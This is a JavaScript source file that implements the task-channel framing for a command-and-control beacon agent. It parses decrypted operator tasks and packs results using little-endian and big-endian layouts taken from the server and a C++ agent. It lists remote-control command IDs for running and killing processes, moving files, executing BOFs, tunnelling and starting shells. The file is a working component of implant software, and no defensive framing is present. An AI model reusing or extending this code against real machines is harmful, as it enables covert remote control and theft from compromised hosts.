// tasks.js — task-channel framing. ASYMMETRIC, per canonical sources:
//   server->agent (post-RC4): LITTLE-ENDIAN  (Go pl_packer.go PackArray)
//     u32le total_size (excludes itself) | per task: u32le cmd, args.., u32le taskId (TRAILING)
//     strings: u32le len + bytes + NUL(s)
//   agent->server (post-RC4): BIG-ENDIAN   (C++ Packer.cpp; Go ParseInt32 BE)
//     u32be total_size (INCLUDES itself — MainAgent Set32(0, datasize()))
//     per result: u32be taskId | u32be cmd | fields (u32be / u32be len + raw)
// Command ids: beacon_agent/src_beacon/beacon/Commander.h
const CP = {
  PWD: 4, CD: 8, CP_: 12, LS: 14, DISKS: 15, RM: 17, MV: 18, PROFILE: 21,
  GETUID: 22, REV2SELF: 23, CAT: 24, MKDIR: 27,
  DOWNLOAD: 32, UPLOAD: 33, DOWNLOAD_STATE: 35,
  PS_LIST: 41, PS_KILL: 42, PS_RUN: 43,
  JOB_LIST: 46, JOB_KILL: 47, EXEC_BOF: 50, EXEC_BOF_OUT: 51,
  TERMINATE: 10,
  TUNNEL_START: 62, TUNNEL_WRITE: 64, TUNNEL_CLOSE: 66,
  TUNNEL_PAUSE: 69, TUNNEL_RESUME: 70,
  SHELL_START: 71,
  SAVEMEMORY: 0x2321, ERROR: 0x1111ffff,
};

class TaskReader {
  constructor(buf) {
    this.buf = buf;
    if (buf.length >= 4) {
      const total = buf.readUInt32LE(0);
      this.end = Math.min(buf.length, 4 + total);
      this.pos = 4;
    } else { this.end = buf.length; this.pos = 0; }
  }
  get hasMore() { return this.pos + 8 <= this.end; } // cmd + trailing taskId
  u32() { if (this.pos + 4 > this.end) throw new Error('task stream underrun'); const v = this.buf.readUInt32LE(this.pos); this.pos += 4; return v; }
  u8()  { if (this.pos + 1 > this.end) throw new Error('task stream underrun'); return this.buf[this.pos++]; }
  raw() { const n = this.u32(); if (this.pos + n > this.end) throw new Error('task stream underrun'); const b = this.buf.subarray(this.pos, this.pos + n); this.pos += n; return b; }
  str() { let b = this.raw(); while (b.length && b[b.length - 1] === 0) b = b.subarray(0, b.length - 1); return b.toString('utf8'); }
}

class OutPacker {
  constructor() { this.parts = []; }
  u8(v)  { this.parts.push(Buffer.from([v & 0xff])); return this; }
  u16(v) { const b = Buffer.allocUnsafe(2); b.writeUInt16BE(v & 0xffff, 0); this.parts.push(b); return this; }
  u32(v) { const b = Buffer.allocUnsafe(4); b.writeUInt32BE(v >>> 0, 0); this.parts.push(b); return this; }
  u64(v) { const b = Buffer.allocUnsafe(8); b.writeBigUInt64BE(BigInt(v) & 0xffffffffffffffffn, 0); this.parts.push(b); return this; }
  bytes(d) { this.u32(d.length); this.parts.push(Buffer.from(d)); return this; }
  str(s) { return this.bytes(Buffer.from(String(s), 'utf8')); }
  build() { // u32be total counting ITSELF, then payload
    const p = Buffer.concat(this.parts);
    const s = Buffer.allocUnsafe(4); s.writeUInt32BE(p.length + 4, 0);
    return Buffer.concat([s, p]);
  }
}

// yields {commandId, reader}; handler reads args first, trailing taskId last
function* iterateTasks(buf) {
  const r = new TaskReader(buf);
  while (r.hasMore) yield { commandId: r.u32(), reader: r };
}

module.exports = { TaskReader, OutPacker, iterateTasks, CP };
